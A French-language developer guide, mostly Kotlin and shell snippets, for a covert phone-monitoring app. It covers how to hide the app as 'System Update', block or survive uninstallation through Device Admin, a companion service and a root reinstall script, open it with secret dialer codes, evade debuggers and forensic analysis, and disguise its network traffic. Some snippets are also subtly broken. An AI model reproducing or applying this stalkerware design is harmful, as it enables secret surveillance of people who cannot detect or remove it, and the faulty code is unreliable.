# Guide de Sécurité et Optimisation Batterie - Application Surveillée

## 1. Architecture de sécurité

### 1.1 Principes de sécurité spécifiques

**Contraintes uniques de l'app surveillée :**
```
Défis sécurité :
- Données ultra-sensibles collectées
- Fonctionnement permanent requis
- Cible potentielle d'attaques
- Protection anti-désinstallation
- Discrétion nécessaire

Approche sécurité :
1. Chiffrement systématique
2. Obfuscation maximale
3. Anti-tampering actif
4. Isolation des données
5. Audit trail complet
```

### 1.2 Modèle de menaces

**Menaces spécifiques et mitigations :**
```
Menaces identifiées :
- Désinstallation non autorisée → Device Admin
- Découverte par utilisateur → Mode invisible
- Interception données → Chiffrement E2E
- Modification app → Integrity checks
- Analyse reverse → Obfuscation forte

Acteurs malveillants :
- Utilisateur surveillé hostile
- Apps malveillantes tierces
- Attaquants réseau
- Forensics tools
```

## 2. Protection des données collectées

### 2.1 Chiffrement au repos

**Stratégie de chiffrement local :**
```
Architecture chiffrement :
- SQLCipher pour base données
- AES-256 pour fichiers
- Clés dans Android Keystore
- IV unique par enregistrement
- Rotation clés mensuelle

Implémentation SQLCipher :
class SecureDatabase {
  companion object {
    fun create(context: Context): SupportSQLiteDatabase {
      val passphrase = getOrCreatePassphrase(context)
      return SQLiteDatabase.create(
        context,
        "monitored_data.db",
        passphrase,
        SQLCipherOptions.Builder()
          .setCipher(Cipher.AES_256_GCM)
          .setKdfIteration(64000)
          .build()
      )
    }
  }
}

Chiffrement fichiers :
fun encryptFile(file: File): EncryptedFile {
  val key = getFileEncryptionKey()
  val iv = SecureRandom().generateSeed(16)
  val cipher = Cipher.getInstance("AES/GCM/NoPadding")
  cipher.init(ENCRYPT_MODE, key, GCMParameterSpec(128, iv))
  
  // Stream encryption pour gros fichiers
  file.inputStream().use { input ->
    encryptedFile.outputStream().use { output ->
      val buffer = ByteArray(4096)
      while (input.read(buffer) != -1) {
        output.write(cipher.update(buffer))
      }
      output.write(cipher.doFinal())
    }
  }
}
```

### 2.2 Isolation des données

**Compartimentage sécurisé :**
```
Stratégies d'isolation :
- Processus séparés si possible
- Permissions minimales
- SELinux contexts (si root)
- Répertoires app-private only
- Pas de données en externe

Structure stockage :
/data/data/com.xpsafeconnect.monitored/
├── databases/
│   └── encrypted.db (SQLCipher)
├── files/
│   ├── temp/ (auto-cleanup)
│   └── secure/ (encrypted)
├── shared_prefs/
│   └── encrypted_prefs.xml
└── no_backup/ (exclu des sauvegardes)
```

### 2.3 Nettoyage sécurisé

**Effacement sécurisé des données :**
```
Secure wipe implementation :
fun secureDelete(file: File) {
  if (!file.exists()) return
  
  val random = SecureRandom()
  val size = file.length()
  
  // Overwrite 3 passes
  repeat(3) { pass ->
    RandomAccessFile(file, "rw").use { raf ->
      val buffer = ByteArray(4096)
      var position = 0L
      while (position < size) {
        random.nextBytes(buffer)
        raf.seek(position)
        raf.write(buffer)
        position += buffer.size
      }
    }
  }
  
  // Delete file
  file.delete()
  
  // Trigger GC
  System.gc()
}

Memory clearing :
- Arrays.fill() pour arrays
- Clear StringBuilders
- Nullify references
- Force GC après données sensibles
```

## 3. Protection anti-désinstallation

### 3.1 Device Admin API

**Implémentation administrateur appareil :**
```
DeviceAdminReceiver setup :
class AntiUninstallAdmin : DeviceAdminReceiver() {
  override fun onEnabled(context: Context, intent: Intent) {
    // Admin activé, logger
    logSecurityEvent("ADMIN_ENABLED")
  }
  
  override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
    // Avertir avant désactivation
    sendAlert("Tentative désactivation protection")
    return "Protection active. Contactez l'administrateur."
  }
  
  override fun onDisabled(context: Context, intent: Intent) {
    // Dernier recours, sauvegarder données critiques
    emergencyBackup()
    notifyRemoteDevice()
  }
}

Activation programmatique :
fun requestDeviceAdmin(activity: Activity) {
  val component = ComponentName(activity, AntiUninstallAdmin::class.java)
  val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
    putExtra(EXTRA_DEVICE_ADMIN, component)
    putExtra(EXTRA_ADD_EXPLANATION, "Protection nécessaire")
  }
  activity.startActivityForResult(intent, REQUEST_ADMIN)
}
```

### 3.2 Mécanismes de persistance

**Survie aux tentatives de suppression :**
```
Stratégies multiples :
1. Device Admin principal
2. Backup APK caché
3. Service companion
4. Scheduled jobs redondants
5. Réveil par push

Companion service :
- Package name différent
- Surveille app principale
- Relance si besoin
- Échange de heartbeats

Auto-reinstall (si root) :
fun setupAutoReinstall() {
  // Copier APK vers système
  copyApkToSystem("/system/priv-app/")
  
  // Script init.d
  createInitScript("""
    #!/system/bin/sh
    # Check if app exists
    if [ ! -d "/data/data/$PACKAGE" ]; then
      pm install -r /system/priv-app/$APK_NAME
    fi
  """)
}
```

## 4. Optimisation batterie avancée

### 4.1 Profiling consommation

**Analyse détaillée de l'usage batterie :**
```
Métriques à surveiller :
- CPU time par service
- Wakelock duration
- GPS active time
- Network transfers
- Screen on correlation

Battery stats collection :
class BatteryProfiler {
  private val stats = mutableMapOf<String, BatteryUsage>()
  
  fun startProfiling(tag: String) {
    stats[tag] = BatteryUsage(
      startTime = SystemClock.elapsedRealtime(),
      startBattery = getBatteryLevel(),
      cpuTime = Debug.threadCpuTimeNanos()
    )
  }
  
  fun endProfiling(tag: String): UsageReport {
    val start = stats[tag] ?: return
    return UsageReport(
      duration = SystemClock.elapsedRealtime() - start.startTime,
      batteryDrain = start.startBattery - getBatteryLevel(),
      cpuUsage = Debug.threadCpuTimeNanos() - start.cpuTime
    )
  }
}

Optimisations identifiées :
- GPS : 40% de la consommation
- Network : 25%
- CPU (processing) : 20%
- Autres : 15%
```

### 4.2 Stratégies d'économie

**Techniques avancées d'optimisation :**
```
GPS Optimization :
class AdaptiveLocationManager {
  fun determineLocationStrategy(batteryLevel: Int): LocationRequest {
    return when {
      batteryLevel > 50 -> LocationRequest.create().apply {
        priority = PRIORITY_HIGH_ACCURACY
        interval = 60_000 // 1 minute
        fastestInterval = 30_000
      }
      
      batteryLevel > 30 -> LocationRequest.create().apply {
        priority = PRIORITY_BALANCED_POWER_ACCURACY
        interval = 300_000 // 5 minutes
        fastestInterval = 120_000
        smallestDisplacement = 50f // 50 mètres
      }
      
      batteryLevel > 15 -> LocationRequest.create().apply {
        priority = PRIORITY_LOW_POWER
        interval = 900_000 // 15 minutes
        maxWaitTime = 3600_000 // Batch 1 heure
      }
      
      else -> LocationRequest.create().apply {
        priority = PRIORITY_NO_POWER // Passive seulement
        interval = 1800_000 // 30 minutes
      }
    }
  }
}

Network Optimization :
- Job batching avec WorkManager
- Préférence WiFi aggressive
- Compression maximale < 30% batterie
- Defer uploads non critiques

CPU Optimization :
- Throttling des collectors
- Processing async seulement
- Cache agressif résultats
- Skip calculs non essentiels
```

### 4.3 Doze mode et App Standby

**Gestion des modes d'économie Android :**
```
Doze Mode handling :
class DozeManager {
  fun isInDozeMode(): Boolean {
    val pm = context.getSystemService<PowerManager>()
    return pm?.isDeviceIdleMode == true
  }
  
  fun requestDozeWhitelist() {
    if (!isIgnoringBatteryOptimizations()) {
      val intent = Intent(ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
        data = Uri.parse("package:$packageName")
      }
      context.startActivity(intent)
    }
  }
  
  fun adaptToDoze() {
    if (isInDozeMode()) {
      // Réduire drastiquement l'activité
      pauseNonCriticalCollectors()
      extendSyncIntervals()
      disableMediaCapture()
    }
  }
}

App Standby Buckets :
- ACTIVE : Fonctionnement normal
- WORKING_SET : Légères restrictions
- FREQUENT : Restrictions modérées
- RARE : Fortes restrictions
- RESTRICTED : Sévères limitations

Adaptation :
fun adaptToBucket(bucket: Int) {
  when (bucket) {
    STANDBY_BUCKET_ACTIVE -> normalOperation()
    STANDBY_BUCKET_WORKING_SET -> reduceFrequency(0.8f)
    STANDBY_BUCKET_FREQUENT -> reduceFrequency(0.5f)
    STANDBY_BUCKET_RARE -> emergencyModeOnly()
    STANDBY_BUCKET_RESTRICTED -> survivalMode()
  }
}
```

### 4.4 Wake locks optimization

**Gestion minimale des wake locks :**
```
WakeLock best practices :
class WakeLockManager {
  private val wakeLocks = mutableMapOf<String, PowerManager.WakeLock>()
  
  fun acquireWakeLock(tag: String, timeout: Long = 60_000) {
    val wakeLock = powerManager.newWakeLock(
      PARTIAL_WAKE_LOCK or ON_AFTER_RELEASE,
      "$packageName:$tag"
    )
    
    wakeLock.acquire(timeout)
    wakeLocks[tag] = wakeLock
    
    // Auto-release safety
    handler.postDelayed({
      releaseWakeLock(tag)
    }, timeout)
  }
  
  fun releaseWakeLock(tag: String) {
    wakeLocks[tag]?.let { wakeLock ->
      if (wakeLock.isHeld) {
        wakeLock.release()
      }
      wakeLocks.remove(tag)
    }
  }
}

Usage patterns :
- Max 60 secondes par lock
- Release ASAP
- Use timeout always
- Count active locks
- Log pour debugging
```

## 5. Mode furtif avancé

### 5.1 Techniques de camouflage

**Masquage avancé de l'application :**
```
Camouflage système :
class StealthMode {
  fun enableStealthMode() {
    // Change app name
    changeAppLabel("System Update")
    
    // Change app icon
    changeAppIcon(R.mipmap.ic_system_update)
    
    // Hide from launcher
    setComponentEnabled(
      MainActivity::class.java,
      COMPONENT_ENABLED_STATE_DISABLED
    )
    
    // Minimal notifications
    NotificationHelper.useStealthChannel()
    
    // No recent tasks
    excludeFromRecents()
  }
  
  private fun changeAppIcon(iconRes: Int) {
    // Utiliser activity-alias
    packageManager.setComponentEnabledSetting(
      ComponentName(packageName, "SystemUpdateAlias"),
      COMPONENT_ENABLED_STATE_ENABLED,
      DONT_KILL_APP
    )
  }
}

Notification furtive :
- Importance MINIMUM
- Pas de son/vibration
- Icône système générique
- Texte technique obscur
- Groupe avec system notifs
```

### 5.2 Accès caché

**Méthodes d'accès discrètes :**
```
Dialer codes :
class SecretCodeReceiver : BroadcastReceiver() {
  override fun onReceive(context: Context, intent: Intent) {
    if (intent.action == "android.provider.Telephony.SECRET_CODE") {
      val code = intent.data?.host
      when (code) {
        "8233" -> openHiddenApp() // *#*#8233#*#*
        "7378" -> toggleStealthMode() // *#*#7378#*#*
        "3633" -> emergencyMode() // *#*#3633#*#*
      }
    }
  }
}

Autres méthodes :
- Triple tap notification
- Specific app sequence
- Time-based pattern
- Hidden widget
- Intent broadcast
```

## 6. Protection runtime

### 6.1 Anti-debugging

**Détection et protection debugging :**
```
Debug detection :
class AntiDebug {
  fun isDebugged(): Boolean {
    return checkDebuggerConnected() ||
           checkDebugFlags() ||
           checkTracerPid() ||
           checkDebugPort() ||
           checkTimingAnomaly()
  }
  
  private fun checkDebuggerConnected(): Boolean {
    return Debug.isDebuggerConnected()
  }
  
  private fun checkDebugFlags(): Boolean {
    return applicationInfo.flags and FLAG_DEBUGGABLE != 0
  }
  
  private fun checkTracerPid(): Boolean {
    val status = File("/proc/self/status").readText()
    return status.contains("TracerPid") && 
           !status.contains("TracerPid:\t0")
  }
}

Protection actions :
if (isDebugged()) {
  // Mode dégradé
  disableSensitiveFeatures()
  logSecurityEvent("DEBUG_DETECTED")
  // Pas de crash pour éviter analyse
}
```

### 6.2 Integrity verification

**Vérification intégrité de l'app :**
```
APK signature check :
fun verifyAppIntegrity(): Boolean {
  val packageInfo = packageManager.getPackageInfo(
    packageName,
    GET_SIGNATURES
  )
  
  val signatures = packageInfo.signatures
  val expectedSignature = "308201e53082...​" // Hash attendu
  
  return signatures.all { signature ->
    val hash = MessageDigest.getInstance("SHA256")
      .digest(signature.toByteArray())
      .toHexString()
    hash == expectedSignature
  }
}

Runtime integrity :
class IntegrityChecker {
  private val criticalClasses = listOf(
    "com.xpsafeconnect.SecurityManager",
    "com.xpsafeconnect.DataCollector",
    "com.xpsafeconnect.CryptoHelper"
  )
  
  fun checkIntegrity() {
    criticalClasses.forEach { className ->
      val clazz = Class.forName(className)
      val methods = clazz.declaredMethods
      
      // Vérifier nombre de méthodes
      // Vérifier signatures
      // Détecter hooks
    }
  }
}
```

## 7. Communication sécurisée

### 7.1 Certificate pinning renforcé

**Implémentation robuste du pinning :**
```
Multiple pins strategy :
class CertificatePinner {
  private val pins = listOf(
    "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", // Cert actuel
    "sha256/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=", // Backup
    "sha256/CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC="  // Root CA
  )
  
  fun createPinner(): CertificatePinner {
    return CertificatePinner.Builder()
      .add("api.safeconnect.com", *pins.toTypedArray())
      .build()
  }
  
  fun validateCertificate(chain: List<X509Certificate>): Boolean {
    return chain.any { cert ->
      val publicKey = cert.publicKey.encoded
      val hash = MessageDigest.getInstance("SHA-256").digest(publicKey)
      val pin = "sha256/" + Base64.encode(hash, NO_WRAP)
      pins.contains(pin)
    }
  }
}
```

### 7.2 Obfuscation réseau

**Masquage du trafic :**
```
Traffic obfuscation :
- Headers randomisés
- Padding aléatoire
- Timing variable
- Faux traffic noise

Implementation :
class ObfuscatedClient {
  fun sendRequest(data: ByteArray): Response {
    // Ajouter padding aléatoire
    val padding = Random.nextBytes(Random.nextInt(100, 500))
    val obfuscated = data + padding
    
    // Headers aléatoires
    val headers = mapOf(
      "X-Request-ID" to UUID.randomUUID(),
      "X-Client-Version" to randomVersion(),
      "X-Timestamp" to randomizedTimestamp()
    )
    
    // Délai aléatoire
    delay(Random.nextLong(100, 1000))
    
    return client.post(obfuscated, headers)
  }
}
```

## 8. Audit et conformité

### 8.1 Logging sécurisé

**Système d'audit inviolable :**
```
Secure audit trail :
class SecurityAuditLog {
  private val logFile = File(context.filesDir, "audit.log.enc")
  
  fun logSecurityEvent(event: SecurityEvent) {
    val entry = AuditEntry(
      timestamp = System.currentTimeMillis(),
      event = event.type,
      details = event.details,
      hash = calculateHash(event)
    )
    
    // Chiffrer et append
    val encrypted = encrypt(entry.toJson())
    logFile.appendBytes(encrypted)
    
    // Rotation si trop gros
    if (logFile.length() > MAX_LOG_SIZE) {
      rotateLog()
    }
  }
  
  private fun calculateHash(event: SecurityEvent): String {
    // Chain hash pour intégrité
    val previousHash = getLastHash()
    val content = "$previousHash${event.type}${event.timestamp}"
    return sha256(content)
  }
}

Events à logger :
- Tentatives désinstallation
- Changements permissions
- Accès données sensibles
- Détection root/debug
- Failures authentification
```

### 8.2 Conformité légale

**Respect des obligations :**
```
GDPR/Privacy compliance :
- Consentement tracé
- Données minimales
- Durée limitée
- Chiffrement fort
- Droit à l'oubli

Implementation :
class PrivacyCompliance {
  fun enforceDataMinimization() {
    // Collecter seulement le nécessaire
    val allowedDataTypes = getConsentedDataTypes()
    collectors.forEach { collector ->
      if (!allowedDataTypes.contains(collector.type)) {
        collector.disable()
      }
    }
  }
  
  fun handleDeletionRequest() {
    // Arrêter collecte
    stopAllCollectors()
    
    // Supprimer données locales
    secureWipeAllData()
    
    // Notifier serveur
    notifyDataDeletion()
    
    // Self-destruct app
    uninstallSelf()
  }
}
```

## 9. Recovery et resilience

### 9.1 Self-healing mechanisms

**Auto-réparation de l'app :**
```
Health check system :
class SelfHealingManager {
  fun performHealthCheck() {
    val issues = detectIssues()
    
    issues.forEach { issue ->
      when (issue) {
        Issue.SERVICE_DEAD -> restartService()
        Issue.PERMISSION_LOST -> requestPermissionAgain()
        Issue.DATABASE_CORRUPT -> rebuildDatabase()
        Issue.NETWORK_BLOCKED -> switchNetworkStrategy()
        Issue.STORAGE_FULL -> cleanupStorage()
      }
    }
  }
  
  private fun detectIssues(): List<Issue> {
    return buildList {
      if (!isServiceRunning()) add(Issue.SERVICE_DEAD)
      if (!hasRequiredPermissions()) add(Issue.PERMISSION_LOST)
      if (!isDatabaseHealthy()) add(Issue.DATABASE_CORRUPT)
      if (!canReachServer()) add(Issue.NETWORK_BLOCKED)
      if (isStorageNearlyFull()) add(Issue.STORAGE_FULL)
    }
  }
}
```

### 9.2 Disaster recovery

**Plan de récupération d'urgence :**
```
Emergency protocols :
1. Backup critique avant crash
2. State preservation
3. Crash report sécurisé
4. Auto-restart robuste
5. Sync recovery data

Implementation :
class DisasterRecovery {
  fun handleCriticalError(error: Throwable) {
    try {
      // Sauver état actuel
      preserveCurrentState()
      
      // Backup données non sync
      emergencyBackup()
      
      // Notifier remote
      sendCrashNotification(error)
      
      // Préparer restart
      scheduleRestart()
      
    } catch (e: Exception) {
      // Dernier recours
      forceCrashAndRestart()
    }
  }
}
```